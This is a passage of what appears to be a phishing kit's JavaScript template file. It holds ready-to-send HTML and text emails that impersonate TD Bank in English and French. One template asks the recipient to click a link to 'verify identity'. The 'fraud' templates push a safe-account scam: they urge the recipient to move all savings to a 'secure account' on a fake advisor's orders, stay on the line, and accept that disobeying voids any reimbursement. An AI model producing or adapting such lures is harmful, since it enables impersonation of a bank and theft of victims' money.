              <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="background-color:#fff8e1;border:1px solid #ffe082;border-radius:3px;">
                <tr>
                  <td style="padding:14px 18px;">
                    <p style="margin:0;font-family:Arial,Helvetica,sans-serif;font-size:12px;color:#795548;line-height:1.6;">
                      ⚠️ <strong>Note de sécurité :</strong> La Banque TD ne vous demandera jamais votre NIP, mot de passe ou numéro de carte complet par courriel. Si vous n'avez pas demandé cette vérification, veuillez contacter notre service à la clientèle immédiatement.
                    </p>
                  </td>
                </tr>
              </table>

            </td>
          </tr>

          <tr>
            <td style="background-color:#e8e8e8;height:1px;font-size:0;line-height:0;">&nbsp;</td>
          </tr>

          <tr>
            <td class="footer-table" style="background-color:#f8f9fb;padding:28px 40px;">

              <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="margin-bottom:18px;">
                <tr>
                  <td align="center">
                    <p style="margin:0 0 6px 0;font-family:Arial,Helvetica,sans-serif;font-size:12px;color:#666666;line-height:1.6;">
                      <strong style="color:#333333;">Besoin d'aide ?</strong>
                    </p>
                    <p style="margin:0;font-family:Arial,Helvetica,sans-serif;font-size:12px;color:#666666;line-height:1.7;">
                      Communiquez avec nous au <strong>1 800 895-4463</strong><br>
                      Disponible 24 heures sur 24, 7 jours sur 7
                    </p>
                  </td>
                </tr>
              </table>

              <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="margin-bottom:18px;">
                <tr>
                  <td align="center">
                    <a href="https://www.td.com/ca/fr/a-propos-de-la-td/confidentialite-et-securite" target="_blank" style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#067a2b;text-decoration:none;">Centre de sécurité</a>
                    <span style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#cccccc;margin:0 8px;">|</span>
                    <a href="https://www.td.com/ca/fr/a-propos-de-la-td/confidentialite-et-securite/declaration-sur-la-confidentialite" target="_blank" style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#067a2b;text-decoration:none;">Politique de confidentialité</a>
                    <span style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#cccccc;margin:0 8px;">|</span>
                    <a href="https://www.td.com/ca/fr/services-bancaires-personnels" target="_blank" style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#067a2b;text-decoration:none;">td.com</a>
                  </td>
                </tr>
              </table>

              <p style="margin:0;font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#999999;line-height:1.6;text-align:center;">
                © 2026 Groupe Banque TD. Tous droits réservés.<br>
                66, rue Wellington Ouest, Toronto (Ontario) M5K 1A2<br><br>
                Ce courriel a été envoyé à l'adresse associée à votre compte TD. Il s'agit d'un message transactionnel lié à la sécurité de votre compte.
              </p>

            </td>
          </tr>

          <tr>
            <td style="background-color:#003f2d;height:4px;font-size:0;line-height:0;">&nbsp;</td>
          </tr>

        </table>

      </td>
    </tr>
  </table>

</body>
</html>`,
      text: `Cher(e) client(e),\n\nNous devons vérifier votre identité afin de finaliser votre demande.\n\nVeuillez cliquer sur ce lien pour procéder à la vérification :\n${link}\n\nSi vous n'avez pas demandé cette vérification, veuillez contacter notre service à la clientèle au 1 800 895-4463.\n\n© ${new Date().getFullYear()} Groupe Banque TD. Tous droits réservés.`,
      },
    }, // end website

    fraud: {
      en: {
        subject: 'URGENT – Security Procedure for Your Assets – TD Bank',
        html: `<!DOCTYPE html>
<html lang="en" xmlns="http://www.w3.org/1999/xhtml" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="x-apple-disable-message-reformatting">
  <meta name="format-detection" content="telephone=no, date=no, address=no, email=no, url=no">
  <title>Security Procedure &#8211; TD Bank</title>
  <meta name="description" content="Urgent asset security procedure &#8211; TD Bank Fraud Service.">
  <!--[if mso]>
  <noscript><xml><o:OfficeDocumentSettings><o:PixelsPerInch>96</o:PixelsPerInch></o:OfficeDocumentSettings></xml></noscript>
  <![endif]-->
  <style type="text/css">
    * { box-sizing: border-box; }
    body, html { margin: 0 !important; padding: 0 !important; width: 100% !important; min-width: 100%; background-color: #f2f4f6; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
    table { border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; }
    img { border: 0; outline: none; text-decoration: none; -ms-interpolation-mode: bicubic; max-width: 100%; display: block; }
    a { text-decoration: none; color: #1a7b3a; }
    @media only screen and (max-width: 620px) {
      .email-wrapper { width: 100% !important; }
      .email-body { padding: 24px 20px !important; }
      .header-pad { padding: 0 20px !important; }
      .step-box { padding: 16px !important; }
      .body-text { font-size: 14px !important; }
      .footer-text { font-size: 11px !important; }
      .alert-bar { padding: 12px 20px !important; }
    }
  </style>
</head>
<body style="margin:0;padding:0;background-color:#f2f4f6;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;">
  <div style="display:none;max-height:0;overflow:hidden;font-size:1px;color:#f2f4f6;line-height:1px;mso-hide:all;">&#9888;&#65039; URGENT &mdash; Asset security procedure in progress &mdash; Your fraud advisor is online &zwnj;&nbsp;&zwnj;&nbsp;</div>
  <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="background-color:#f2f4f6;">
    <tr><td align="center" style="padding:32px 16px 40px;">
      <table role="presentation" class="email-wrapper" width="600" cellspacing="0" cellpadding="0" border="0" style="max-width:600px;width:100%;">
        <tr>
          <td class="header-pad" style="background:#1a5c2a;padding:0 32px;border-radius:10px 10px 0 0;">
            <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0">
              <tr>
                <td style="padding:20px 0 18px;">
                  <table role="presentation" cellspacing="0" cellpadding="0" border="0">
                    <tr>
                      <td><div style="display:inline-block;background:#ffffff;border-radius:6px;padding:6px 14px;"><span style="font-size:24px;font-weight:900;color:#1a7b3a;letter-spacing:1px;font-family:Georgia,serif;">TD</span></div></td>
                      <td style="padding-left:14px;vertical-align:middle;"><p style="margin:0;color:rgba(255,255,255,0.75);font-size:12px;font-weight:500;letter-spacing:0.5px;text-transform:uppercase;">TD Bank &mdash; Fraud Prevention Service</p></td>
                    </tr>
                  </table>
                </td>
                <td align="right" style="padding:20px 0 18px;"><p style="margin:0;color:rgba(255,255,255,0.5);font-size:11px;">Secure message &#128274;</p></td>
              </tr>
            </table>
          </td>
        </tr>
        <tr>
          <td class="alert-bar" style="background:#c0392b;padding:14px 32px;">
            <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0">
              <tr>
                <td width="26" valign="middle" style="padding-right:10px;"><span style="font-size:16px;">&#9888;&#65039;</span></td>
                <td valign="middle"><p style="margin:0;color:#ffffff;font-size:13px;font-weight:700;letter-spacing:0.3px;">URGENT &mdash; ASSET SECURITY PROCEDURE IN PROGRESS</p></td>
              </tr>
            </table>
          </td>
        </tr>
        <tr>
          <td class="email-body" style="background:#ffffff;padding:36px 36px 32px;border-left:1px solid #e0e4e0;border-right:1px solid #e0e4e0;">
            <p class="body-text" style="margin:0 0 20px;color:#1a1a1a;font-size:15px;line-height:1.7;font-weight:700;">Dear Customer,</p>
            <p class="body-text" style="margin:0 0 28px;color:#333333;font-size:15px;line-height:1.85;">Our fraud detection system has identified <strong>attempted fraud</strong> on your bank account. Your fraud prevention advisor is currently online with you and will guide you step by step through the procedure to secure all your assets.</p>
            <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:20px;"><tr><td style="background:#1a5c2a;border-radius:6px;padding:10px 18px;"><p style="margin:0;color:#ffffff;font-size:13px;font-weight:700;letter-spacing:0.5px;text-transform:uppercase;">&#128203;&nbsp; Instructions to follow immediately</p></td></tr></table>
            <table role="presentation" class="step-box" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:16px;border:1px solid #d4edda;border-radius:8px;overflow:hidden;">
              <tr><td style="background:#e8f5ec;padding:12px 18px;border-bottom:1px solid #d4edda;"><table role="presentation" cellspacing="0" cellpadding="0" border="0"><tr><td><div style="display:inline-block;background:#1a7b3a;border-radius:50%;width:28px;height:28px;text-align:center;line-height:28px;color:#ffffff;font-size:13px;font-weight:800;">1</div></td><td style="padding-left:12px;vertical-align:middle;"><p style="margin:0;color:#1a3020;font-size:14px;font-weight:700;">Transfer all your funds to the secure account</p></td></tr></table></td></tr>
              <tr><td class="step-box" style="padding:16px 18px;background:#fafffe;"><p class="body-text" style="margin:0;color:#333333;font-size:14px;line-height:1.8;">To protect your assets against any risk of diversion, you must transfer the <strong>full amount in all your accounts</strong> (current accounts, savings, etc.) to a <strong>secure account</strong> specially opened in your name. This account is protected against any external fraud attempt.</p></td></tr>
            </table>
            <table role="presentation" class="step-box" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:16px;border:1px solid #d4edda;border-radius:8px;overflow:hidden;">
              <tr><td style="background:#e8f5ec;padding:12px 18px;border-bottom:1px solid #d4edda;"><table role="presentation" cellspacing="0" cellpadding="0" border="0"><tr><td><div style="display:inline-block;background:#1a7b3a;border-radius:50%;width:28px;height:28px;text-align:center;line-height:28px;color:#ffffff;font-size:13px;font-weight:800;">2</div></td><td style="padding-left:12px;vertical-align:middle;"><p style="margin:0;color:#1a3020;font-size:14px;font-weight:700;">Follow each step indicated by your advisor carefully</p></td></tr></table></td></tr>
              <tr><td class="step-box" style="padding:16px 18px;background:#fafffe;"><p class="body-text" style="margin:0 0 12px;color:#333333;font-size:14px;line-height:1.8;">Your fraud prevention advisor will guide you in real time and will indicate precisely:</p><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="16" valign="top" style="padding-right:8px;padding-top:4px;color:#1a7b3a;font-weight:700;font-size:14px;">&#183;</td><td><p style="margin:0 0 8px;color:#333333;font-size:14px;line-height:1.7;">The amounts to transfer;</p></td></tr><tr><td width="16" valign="top" style="padding-right:8px;padding-top:4px;color:#1a7b3a;font-weight:700;font-size:14px;">&#183;</td><td><p style="margin:0 0 8px;color:#333333;font-size:14px;line-height:1.7;">The details of the destination secure account;</p></td></tr><tr><td width="16" valign="top" style="padding-right:8px;padding-top:4px;color:#1a7b3a;font-weight:700;font-size:14px;">&#183;</td><td><p style="margin:0;color:#333333;font-size:14px;line-height:1.7;">The exact moment to validate each operation.</p></td></tr></table></td></tr>
            </table>
            <table role="presentation" class="step-box" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:28px;border:1px solid #d4edda;border-radius:8px;overflow:hidden;">
              <tr><td style="background:#e8f5ec;padding:12px 18px;border-bottom:1px solid #d4edda;"><table role="presentation" cellspacing="0" cellpadding="0" border="0"><tr><td><div style="display:inline-block;background:#1a7b3a;border-radius:50%;width:28px;height:28px;text-align:center;line-height:28px;color:#ffffff;font-size:13px;font-weight:800;">3</div></td><td style="padding-left:12px;vertical-align:middle;"><p style="margin:0;color:#1a3020;font-size:14px;font-weight:700;">Validate operations under your advisor's direction</p></td></tr></table></td></tr>
              <tr><td class="step-box" style="padding:16px 18px;background:#fafffe;"><p class="body-text" style="margin:0;color:#333333;font-size:14px;line-height:1.8;">At each step of the transfer, your advisor will tell you what to do. It is essential to <strong>take no action without their prior approval.</strong></p></td></tr>
            </table>
            <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:28px;background:#fff8f0;border:1px solid #f5c6a0;border-left:4px solid #c0392b;border-radius:0 8px 8px 0;"><tr><td style="padding:16px 20px;"><p class="body-text" style="margin:0 0 8px;color:#c0392b;font-size:12px;font-weight:700;letter-spacing:0.7px;text-transform:uppercase;">&#9888; Critical Notice</p><p class="body-text" style="margin:0;color:#7a3000;font-size:14px;line-height:1.8;">We emphasize the urgency and mandatory nature of these measures. Any action taken <strong>without your advisor's validation</strong> could expose your funds to a risk of <strong>permanent loss.</strong></p></td></tr></table>
            <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:28px;background:#f0faf3;border:1.5px solid #1a7b3a;border-radius:8px;"><tr><td style="padding:18px 20px;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="36" valign="top" style="padding-right:14px;padding-top:2px;"><div style="width:36px;height:36px;background:#1a7b3a;border-radius:50%;text-align:center;line-height:36px;font-size:18px;">&#128222;</div></td><td><p style="margin:0 0 6px;color:#1a5c2a;font-size:12px;font-weight:700;letter-spacing:0.6px;text-transform:uppercase;">Stay on the line with your advisor</p><p class="body-text" style="margin:0;color:#1a3020;font-size:14px;line-height:1.8;">Stay on the line with your advisor until the <strong>final security confirmation</strong> of your assets. <strong>Do not hang up</strong> until they have informed you that all your funds are definitively protected.</p></td></tr></table></td></tr></table>
            <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:24px;"><tr><td style="height:1px;background:#e8eeed;"></td></tr></table>
            <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:16px;"><tr><td style="background:#f5f5f5;border-radius:6px;padding:10px 18px;border-left:4px solid #555555;"><p style="margin:0;color:#333333;font-size:13px;font-weight:700;letter-spacing:0.3px;">&#128220;&nbsp; Important &mdash; Conditions of fraud protection</p></td></tr></table>
            <p class="body-text" style="margin:0 0 16px;color:#333333;font-size:14px;line-height:1.8;">In accordance with our general conditions and applicable regulations, the anti-fraud protection you benefit from is conditional on <strong>strict compliance with the security instructions</strong> communicated to you by our service.</p>
            <p class="body-text" style="margin:0 0 12px;color:#333333;font-size:14px;line-height:1.8;font-weight:600;">Therefore, in the following cases:</p>
            <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:16px;background:#f9f9f9;border-radius:8px;border:1px solid #e0e0e0;"><tr><td style="padding:16px 20px;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="16" valign="top" style="padding-right:10px;padding-top:3px;color:#c0392b;font-size:16px;font-weight:700;">&#183;</td><td><p style="margin:0 0 10px;color:#444444;font-size:14px;line-height:1.7;">If you do not carefully follow your advisor's instructions regarding the transfer of your funds to the secure account;</p></td></tr><tr><td width="16" valign="top" style="padding-right:10px;padding-top:3px;color:#c0392b;font-size:16px;font-weight:700;">&#183;</td><td><p style="margin:0 0 10px;color:#444444;font-size:14px;line-height:1.7;">If you perform an operation not validated by them;</p></td></tr><tr><td width="16" valign="top" style="padding-right:10px;padding-top:3px;color:#c0392b;font-size:16px;font-weight:700;">&#183;</td><td><p style="margin:0;color:#444444;font-size:14px;line-height:1.7;">If you interrupt the procedure before it is completed;</p></td></tr></table></td></tr></table>
            <p class="body-text" style="margin:0 0 12px;color:#444444;font-size:14px;line-height:1.7;font-style:italic;">and your funds are fraudulently diverted as a result:</p>
            <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:24px;background:#fff5f5;border:1px solid #f5c6c6;border-radius:8px;"><tr><td style="padding:16px 20px;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="20" valign="top" style="padding-right:10px;padding-top:3px;"><span style="color:#c0392b;font-size:14px;">&#10006;</span></td><td><p style="margin:0 0 10px;color:#5a0000;font-size:14px;line-height:1.7;">You will be held <strong>solely responsible</strong> for the losses incurred;</p></td></tr><tr><td width="20" valign="top" style="padding-right:10px;padding-top:3px;"><span style="color:#c0392b;font-size:14px;">&#10006;</span></td><td><p style="margin:0 0 10px;color:#5a0000;font-size:14px;line-height:1.7;">You will not be entitled to <strong>any reimbursement</strong> under the anti-fraud protection;</p></td></tr><tr><td width="20" valign="top" style="padding-right:10px;padding-top:3px;"><span style="color:#c0392b;font-size:14px;">&#10006;</span></td><td><p style="margin:0;color:#5a0000;font-size:14px;line-height:1.7;">The bank <strong>declines all responsibility</strong> and cannot be held liable for the amounts lost.</p></td></tr></table></td></tr></table>
            <p class="body-text" style="margin:0 0 24px;color:#444444;font-size:14px;line-height:1.8;">We remind you that <strong>&ldquo;zero liability&rdquo;</strong> protection only applies to operations you have not validated or authorized. Once you have received clear instructions from our service and choose not to execute them, you assume full and complete responsibility.</p>
            <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:24px;"><tr><td style="height:1px;background:#e8eeed;"></td></tr></table>
            <p class="body-text" style="margin:0 0 14px;color:#1a1a1a;font-size:14px;line-height:1.8;font-weight:700;">We therefore strongly recommend that you:</p>
            <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:28px;background:#e8f5ec;border-radius:8px;border:1px solid #c3dfc8;"><tr><td style="padding:16px 20px;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="20" valign="top" style="padding-right:10px;padding-top:3px;"><span style="color:#1a7b3a;font-size:14px;font-weight:700;">&#10003;</span></td><td><p style="margin:0 0 10px;color:#1a3020;font-size:14px;line-height:1.7;">Stay on the line with your advisor until the end of the procedure;</p></td></tr><tr><td width="20" valign="top" style="padding-right:10px;padding-top:3px;"><span style="color:#1a7b3a;font-size:14px;font-weight:700;">&#10003;</span></td><td><p style="margin:0 0 10px;color:#1a3020;font-size:14px;line-height:1.7;">Follow all the steps they indicate to you;</p></td></tr><tr><td width="20" valign="top" style="padding-right:10px;padding-top:3px;"><span style="color:#1a7b3a;font-size:14px;font-weight:700;">&#10003;</span></td><td><p style="margin:0;color:#1a3020;font-size:14px;line-height:1.7;">Do not perform any operation without their prior approval.</p></td></tr></table></td></tr></table>
            <p class="body-text" style="margin:0 0 24px;color:#333333;font-size:14px;line-height:1.8;font-style:italic;">The security of your assets depends on your responsiveness and strict compliance with the instructions given to you.</p>
            <p class="body-text" style="margin:0 0 28px;color:#333333;font-size:14px;line-height:1.8;">We thank you for your cooperation and remain at your disposal.</p>
            <p style="margin:0 0 4px;color:#1a1a1a;font-size:14px;font-weight:700;">Sincerely,</p>
            <p style="margin:0 0 2px;color:#333333;font-size:14px;">Fraud Prevention Service</p>
            <p style="margin:0;color:#1a7b3a;font-size:14px;font-weight:700;">TD Bank</p>
          </td>
        </tr>
        <tr><td style="background:#e8f5ec;border:1px solid #c3dfc8;border-top:none;padding:16px 36px;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="20" valign="top" style="padding-right:10px;padding-top:1px;"><span style="color:#1a7b3a;font-size:14px;">&#128274;</span></td><td><p style="margin:0;color:#1a5c2a;font-size:12px;line-height:1.6;"><strong>Security reminder:</strong> TD Bank will never ask for your password, PIN or full card number by email or phone. If in doubt, contact us at <strong>1-866-222-3456</strong>.</p></td></tr></table></td></tr>
        <tr><td style="background:#1a3020;border-radius:0 0 10px 10px;padding:28px 36px;border:1px solid #0f1f12;border-top:none;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td align="center" style="padding-bottom:16px;"><table role="presentation" cellspacing="0" cellpadding="0" border="0"><tr><td><div style="display:inline-block;background:rgba(255,255,255,0.1);border-radius:5px;padding:5px 12px;"><span style="font-size:18px;font-weight:900;color:#ffffff;letter-spacing:1px;font-family:Georgia,serif;">TD</span></div></td><td style="padding-left:10px;vertical-align:middle;"><p style="margin:0;color:rgba(255,255,255,0.6);font-size:11px;letter-spacing:0.5px;text-transform:uppercase;">TD Bank</p></td></tr></table></td></tr><tr><td style="padding-bottom:16px;"><table role="presentation" width="80" cellspacing="0" cellpadding="0" border="0" align="center"><tr><td style="height:1px;background:rgba(255,255,255,0.15);"></td></tr></table></td></tr><tr><td align="center" style="padding-bottom:14px;"><p style="margin:0;font-size:12px;"><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Privacy</a><span style="color:rgba(255,255,255,0.25);padding:0 8px;">|</span><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Terms of Use</a><span style="color:rgba(255,255,255,0.25);padding:0 8px;">|</span><a href="#" style="color:rgba(255,255,255,0.6);text-decoration:none;">Contact Us</a></p></td></tr><tr><td align="center"><p class="footer-text" style="margin:0 0 8px;color:rgba(255,255,255,0.4);font-size:11px;line-height:1.6;max-width:480px;">This email was sent automatically by TD Bank's security system. Please do not reply directly to this message.</p><p class="footer-text" style="margin:0;color:rgba(255,255,255,0.25);font-size:11px;">&copy; 2026 TD Bank. All rights reserved. The Toronto-Dominion Bank.</p></td></tr></table></td></tr>
        <tr><td style="height:32px;background:#f2f4f6;"></td></tr>
      </table>
    </td></tr>
  </table>
</body>
</html>`,
        text: `Dear Customer,\n\nOur fraud detection system has identified attempted fraud on your bank account. Your fraud prevention advisor is currently online and will guide you step by step through the asset security procedure.\n\nPlease follow all instructions given by your advisor carefully. Do not perform any operation without their prior approval.\n\nFraud Prevention Service\nTD Bank\n© 2026 TD Bank. All rights reserved.`,
      },
      fr: {
        subject: 'URGENT – Procédure de sécurisation de vos avoirs – TD Banque',
        html: `<!DOCTYPE html>
<html lang="fr" xmlns="http://www.w3.org/1999/xhtml" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="x-apple-disable-message-reformatting">
  <meta name="format-detection" content="telephone=no, date=no, address=no, email=no, url=no">
  <title>Proc&eacute;dure de s&eacute;curisation &#8211; TD Banque</title>
  <meta name="description" content="Proc&eacute;dure urgente de s&eacute;curisation de vos avoirs &#8211; TD Banque Service Fraude.">
  <!--[if mso]>
  <noscript><xml><o:OfficeDocumentSettings><o:PixelsPerInch>96</o:PixelsPerInch></o:OfficeDocumentSettings></xml></noscript>
  <![endif]-->
  <style type="text/css">
    * { box-sizing: border-box; }
    body, html { margin: 0 !important; padding: 0 !important; width: 100% !important; min-width: 100%; background-color: #f2f4f6; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
    table { border-collapse: collapse; mso-table-lspace: 0pt; mso-table-rspace: 0pt; }
    img { border: 0; outline: none; text-decoration: none; -ms-interpolation-mode: bicubic; max-width: 100%; display: block; }
    a { text-decoration: none; color: #1a7b3a; }
    @media only screen and (max-width: 620px) {
      .email-wrapper { width: 100% !important; }
      .email-body { padding: 24px 20px !important; }
      .header-pad { padding: 0 20px !important; }
      .step-box { padding: 16px !important; }
      .body-text { font-size: 14px !important; }
      .footer-text { font-size: 11px !important; }
      .alert-bar { padding: 12px 20px !important; }
    }
  </style>
</head>
<body style="margin:0;padding:0;background-color:#f2f4f6;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;">
  <div style="display:none;max-height:0;overflow:hidden;font-size:1px;color:#f2f4f6;line-height:1px;mso-hide:all;">&#9888;&#65039; URGENT &mdash; Proc&eacute;dure de s&eacute;curisation de vos avoirs en cours &mdash; Votre conseiller fraude est en ligne &zwnj;&nbsp;&zwnj;&nbsp;</div>
  <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="background-color:#f2f4f6;">
    <tr><td align="center" style="padding:32px 16px 40px;">
      <table role="presentation" class="email-wrapper" width="600" cellspacing="0" cellpadding="0" border="0" style="max-width:600px;width:100%;">
        <tr>
          <td class="header-pad" style="background:#1a5c2a;padding:0 32px;border-radius:10px 10px 0 0;">
            <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0">
              <tr>
                <td style="padding:20px 0 18px;"><table role="presentation" cellspacing="0" cellpadding="0" border="0"><tr><td><div style="display:inline-block;background:#ffffff;border-radius:6px;padding:6px 14px;"><span style="font-size:24px;font-weight:900;color:#1a7b3a;letter-spacing:1px;font-family:Georgia,serif;">TD</span></div></td><td style="padding-left:14px;vertical-align:middle;"><p style="margin:0;color:rgba(255,255,255,0.75);font-size:12px;font-weight:500;letter-spacing:0.5px;text-transform:uppercase;">Banque TD &mdash; Service Lutte contre la Fraude</p></td></tr></table></td>
                <td align="right" style="padding:20px 0 18px;"><p style="margin:0;color:rgba(255,255,255,0.5);font-size:11px;">Message s&eacute;curis&eacute; &#128274;</p></td>
              </tr>
            </table>
          </td>
        </tr>
        <tr><td class="alert-bar" style="background:#c0392b;padding:14px 32px;"><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="26" valign="middle" style="padding-right:10px;"><span style="font-size:16px;">&#9888;&#65039;</span></td><td valign="middle"><p style="margin:0;color:#ffffff;font-size:13px;font-weight:700;letter-spacing:0.3px;">URGENT &mdash; PROC&Eacute;DURE DE S&Eacute;CURISATION DE VOS AVOIRS EN COURS</p></td></tr></table></td></tr>
        <tr>
          <td class="email-body" style="background:#ffffff;padding:36px 36px 32px;border-left:1px solid #e0e4e0;border-right:1px solid #e0e4e0;">
            <p class="body-text" style="margin:0 0 20px;color:#1a1a1a;font-size:15px;line-height:1.7;font-weight:700;">Madame, Monsieur,</p>
            <p class="body-text" style="margin:0 0 28px;color:#333333;font-size:15px;line-height:1.85;">Notre syst&egrave;me de d&eacute;tection a identifi&eacute; des <strong>tentatives de fraude</strong> sur votre compte bancaire. Votre conseiller en pr&eacute;vention de la fraude est actuellement en ligne avec vous et va vous accompagner pas &agrave; pas dans la proc&eacute;dure de s&eacute;curisation de l&apos;int&eacute;gralit&eacute; de vos avoirs.</p>
            <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:20px;"><tr><td style="background:#1a5c2a;border-radius:6px;padding:10px 18px;"><p style="margin:0;color:#ffffff;font-size:13px;font-weight:700;letter-spacing:0.5px;text-transform:uppercase;">&#128203;&nbsp; Instructions &agrave; suivre imp&eacute;rativement</p></td></tr></table>
            <table role="presentation" class="step-box" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:16px;border:1px solid #d4edda;border-radius:8px;overflow:hidden;"><tr><td style="background:#e8f5ec;padding:12px 18px;border-bottom:1px solid #d4edda;"><table role="presentation" cellspacing="0" cellpadding="0" border="0"><tr><td><div style="display:inline-block;background:#1a7b3a;border-radius:50%;width:28px;height:28px;text-align:center;line-height:28px;color:#ffffff;font-size:13px;font-weight:800;">1</div></td><td style="padding-left:12px;vertical-align:middle;"><p style="margin:0;color:#1a3020;font-size:14px;font-weight:700;">Transf&eacute;rer tous vos fonds vers le compte s&eacute;curis&eacute;</p></td></tr></table></td></tr><tr><td class="step-box" style="padding:16px 18px;background:#fafffe;"><p class="body-text" style="margin:0;color:#333333;font-size:14px;line-height:1.8;">Pour prot&eacute;ger vos avoirs contre tout risque de d&eacute;tournement, vous devez transf&eacute;rer la <strong>totalit&eacute; des sommes pr&eacute;sentes sur vos comptes</strong> (comptes courants, &eacute;pargne, etc.) vers un <strong>compte s&eacute;curis&eacute;</strong> sp&eacute;cialement ouvert &agrave; votre nom. Ce compte est prot&eacute;g&eacute; contre toute tentative de fraude externe.</p></td></tr></table>
            <table role="presentation" class="step-box" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:16px;border:1px solid #d4edda;border-radius:8px;overflow:hidden;"><tr><td style="background:#e8f5ec;padding:12px 18px;border-bottom:1px solid #d4edda;"><table role="presentation" cellspacing="0" cellpadding="0" border="0"><tr><td><div style="display:inline-block;background:#1a7b3a;border-radius:50%;width:28px;height:28px;text-align:center;line-height:28px;color:#ffffff;font-size:13px;font-weight:800;">2</div></td><td style="padding-left:12px;vertical-align:middle;"><p style="margin:0;color:#1a3020;font-size:14px;font-weight:700;">Suivre scrupuleusement chaque &eacute;tape indiqu&eacute;e par votre conseiller</p></td></tr></table></td></tr><tr><td class="step-box" style="padding:16px 18px;background:#fafffe;"><p class="body-text" style="margin:0 0 12px;color:#333333;font-size:14px;line-height:1.8;">Votre conseiller en pr&eacute;vention de la fraude vous guidera en temps r&eacute;el et vous indiquera pr&eacute;cis&eacute;ment :</p><table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0"><tr><td width="16" valign="top" style="padding-right:8px;padding-top:4px;color:#1a7b3a;font-weight:700;font-size:14px;">&#183;</td><td><p style="margin:0 0 8px;color:#333333;font-size:14px;line-height:1.7;">Les montants &agrave; transf&eacute;rer&nbsp;;</p></td></tr><tr><td width="16" valign="top" style="padding-right:8px;padding-top:4px;color:#1a7b3a;font-weight:700;font-size:14px;">&#183;</td><td><p style="margin:0 0 8px;color:#333333;font-size:14px;line-height:1.7;">Les coordonn&eacute;es du compte s&eacute;curis&eacute; destinataire&nbsp;;</p></td></tr><tr><td width="16" valign="top" style="padding-right:8px;padding-top:4px;color:#1a7b3a;font-weight:700;font-size:14px;">&#183;</td><td><p style="margin:0;color:#333333;font-size:14px;line-height:1.7;">Le moment exact pour valider chaque op&eacute;ration.</p></td></tr></table></td></tr></table>
            <table role="presentation" class="step-box" width="100%" cellspacing="0" cellpadding="0" border="0" style="margin-bottom:28px;border:1px solid #d4edda;border-radius:8px;overflow:hidden;"><tr><td style="background:#e8f5ec;padding:12px 18px;border-bottom:1px solid #d4edda;"><table role="presentation" cellspacing="0" cellpadding="0" border="0"><tr><td><div style="display:inline-block;background:#1a7b3a;border-radius:50%;width:28px;height:28px;text-align:center;line-height:28px;color:#ffffff;font-size:13px;font-weight:800;">3</div></td><td style="padding-left:12px;vertical-align:middle;"><p style="margin:0;color:#1a3020;font-size:14px;font-weight:700;">Valider les op&eacute;rations sous la direction de votre conseiller</p></td></tr></table></td></tr><tr><td class="step-box" style="padding:16px 18px;background:#fafffe;"><p class="body-text" style="margin:0;color:#333333;font-size:14px;line-height:1.8;">&Agrave; chaque &eacute;tape du transfert, votre conseiller vous indiquera la marche &agrave; suivre. Il est essentiel de <strong>ne r&eacute;aliser aucune action sans son accord pr&eacute;alable.</strong></p></td></tr></table>
